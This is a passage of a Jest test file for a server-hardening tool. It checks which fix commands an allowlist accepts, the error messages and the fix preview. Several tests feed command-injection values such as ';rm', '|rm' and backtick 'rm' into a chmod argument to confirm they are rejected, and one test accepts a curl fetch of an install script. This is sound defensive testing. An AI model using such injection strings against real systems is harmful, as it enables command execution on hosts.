    expect(isFixCommandAllowed("DEBIAN_FRONTEND=noninteractive apt install -y aide")).toBe(true);
  });

  it("[MUTATION-KILLER] curl command is allowed", () => {
    expect(isFixCommandAllowed("curl -fsSL https://example.com/install.sh")).toBe(true);
  });
});

describe("[MUTATION-KILLER] SHELL_METACHAR — individual character rejection", () => {
  // Each individual metacharacter in the regex [;&|`$()><\n\r\0]
  const safePrefix = "chmod 600 ";

  it("[MUTATION-KILLER] semicolon ; is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/file;rm")).toBe(false);
  });

  it("[MUTATION-KILLER] ampersand & is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/file&rm")).toBe(false);
  });

  it("[MUTATION-KILLER] pipe | is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/file|rm")).toBe(false);
  });

  it("[MUTATION-KILLER] backtick ` is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/`rm`")).toBe(false);
  });

  it("[MUTATION-KILLER] dollar $ is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/$HOME")).toBe(false);
  });

  it("[MUTATION-KILLER] open paren ( is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/(test")).toBe(false);
  });

  it("[MUTATION-KILLER] close paren ) is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/)test")).toBe(false);
  });

  it("[MUTATION-KILLER] greater-than > is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/file>x")).toBe(false);
  });

  it("[MUTATION-KILLER] less-than < is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/file<x")).toBe(false);
  });

  it("[MUTATION-KILLER] newline \\n is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/file\nx")).toBe(false);
  });

  it("[MUTATION-KILLER] carriage return \\r is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/file\rx")).toBe(false);
  });

  it("[MUTATION-KILLER] null byte \\0 is rejected", () => {
    expect(isFixCommandAllowed(safePrefix + "/etc/file\0x")).toBe(false);
  });

  it("[MUTATION-KILLER] safe command without metacharacters is accepted", () => {
    expect(isFixCommandAllowed("chmod 600 /etc/shadow")).toBe(true);
  });
});

describe("[MUTATION-KILLER] runFix — error message string fragments", () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it("[MUTATION-KILLER] error format: '{id}: pre-condition failed — {command}'", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: "SSH-PRECOND",
          category: "SSH",
          name: "Password Auth test",
          severity: "critical",
          passed: false,
          fixCommand: "sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValueOnce({ code: 1, stdout: "", stderr: "not found" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors[0]).toMatch(/SSH-PRECOND: pre-condition failed/);
    expect(fixResult.errors[0]).toContain("pre-condition failed");
    expect(fixResult.errors[0]).toContain("\u2014"); // em-dash separator
  });

  it("[MUTATION-KILLER] error format: '{id}: fix command rejected — {truncated}'", async () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({
          id: "T-REJECT",
          category: "Test",
          severity: "warning",
          passed: false,
          fixCommand: "unknown_cmd test",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors[0]).toMatch(/T-REJECT: fix command rejected/);
    expect(fixResult.errors[0]).toContain("fix command rejected");
    expect(fixResult.errors[0]).toContain("\u2014"); // em-dash separator
  });

  it("[MUTATION-KILLER] error format: '{id}: command failed (exit {code})'", async () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({
          id: "K-FAIL",
          category: "Kernel",
          severity: "warning",
          passed: false,
          fixCommand: "sysctl -w net.ipv4.ip_forward=0",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValueOnce({ code: 1, stdout: "", stderr: "err" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors[0]).toContain("K-FAIL: command failed (exit 1)");
    expect(fixResult.errors[0]).toContain("command failed");
    expect(fixResult.errors[0]).toContain("exit 1");
  });

  it("[MUTATION-KILLER] error includes stderr when present", async () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({
          id: "K-STDERR",
          category: "Kernel",
          severity: "warning",
          passed: false,
          fixCommand: "sysctl -w test=1",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValueOnce({ code: 1, stdout: "", stderr: "specific error" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors[0]).toContain("specific error");
  });

  it("[MUTATION-KILLER] error omits stderr dash when stderr is empty", async () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({
          id: "K-NOSTERR",
          category: "Kernel",
          severity: "warning",
          passed: false,
          fixCommand: "sysctl -w test=1",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValueOnce({ code: 1, stdout: "", stderr: "" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors[0]).toBe("K-NOSTERR: command failed (exit 1)");
  });
});

describe("[MUTATION-KILLER] previewFixes — field names and structure", () => {
  it("[MUTATION-KILLER] FixCheck populates id from check.id", () => {
    const result = makeResult([
      makeCategory("Net", [
        makeCheck({ id: "NET-FW-01", category: "Net", name: "FW Check", severity: "critical", passed: false, fixCommand: "echo safe" }),
      ]),
    ]);
    const plan = previewFixes(result);
    expect(plan.groups[0].checks[0].id).toBe("NET-FW-01");
  });

  it("[MUTATION-KILLER] FixCheck populates category from check.category", () => {
    const result = makeResult([
      makeCategory("Net", [
        makeCheck({ id: "NET-01", category: "Net", name: "Test", severity: "warning", passed: false, fixCommand: "echo safe" }),
      ]),
    ]);
    const plan = previewFixes(result);
    expect(plan.groups[0].checks[0].category).toBe("Net");
  });

  it("[MUTATION-KILLER] FixCheck populates name from check.name", () => {
    const result = makeResult([
      makeCategory("Net", [
        makeCheck({ id: "NET-01", category: "Net", name: "Specific Check Name", severity: "warning", passed: false, fixCommand: "echo safe" }),
      ]),
    ]);
    const plan = previewFixes(result);
    expect(plan.groups[0].checks[0].name).toBe("Specific Check Name");
  });

  it("[MUTATION-KILLER] FixCheck populates severity from check.severity", () => {
    const result = makeResult([
      makeCategory("Net", [
        makeCheck({ id: "NET-01", category: "Net", name: "Test", severity: "info", passed: false, fixCommand: "echo safe" }),
      ]),
    ]);
    const plan = previewFixes(result);
    expect(plan.groups[0].checks[0].severity).toBe("info");
  });

  it("[MUTATION-KILLER] FixCheck populates fixCommand from check.fixCommand", () => {
    const result = makeResult([
      makeCategory("Net", [
        makeCheck({ id: "NET-01", category: "Net", name: "Test", severity: "warning", passed: false, fixCommand: "sysctl -w x=1" }),
      ]),
    ]);
    const plan = previewFixes(result);
    expect(plan.groups[0].checks[0].fixCommand).toBe("sysctl -w x=1");
  });

  it("[MUTATION-KILLER] FixPlan groups is an array", () => {
    const result = makeResult([]);
    const plan = previewFixes(result);
    expect(Array.isArray(plan.groups)).toBe(true);
  });
});

describe("[MUTATION-KILLER] SEVERITY_ORDER values — exact strings", () => {
  it("[MUTATION-KILLER] critical severity is handled", () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({ id: "T-01", category: "Test", severity: "critical", passed: false, fixCommand: "echo x" }),
      ]),
    ]);
    const plan = previewFixes(result);
    expect(plan.groups[0].severity).toBe("critical");
  });

  it("[MUTATION-KILLER] warning severity is handled", () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({ id: "T-01", category: "Test", severity: "warning", passed: false, fixCommand: "echo x" }),
      ]),
    ]);
    const plan = previewFixes(result);
    expect(plan.groups[0].severity).toBe("warning");
  });

  it("[MUTATION-KILLER] info severity is handled", () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({ id: "T-01", category: "Test", severity: "info", passed: false, fixCommand: "echo x" }),
      ]),
    ]);
    const plan = previewFixes(result);
    expect(plan.groups[0].severity).toBe("info");
  });
});
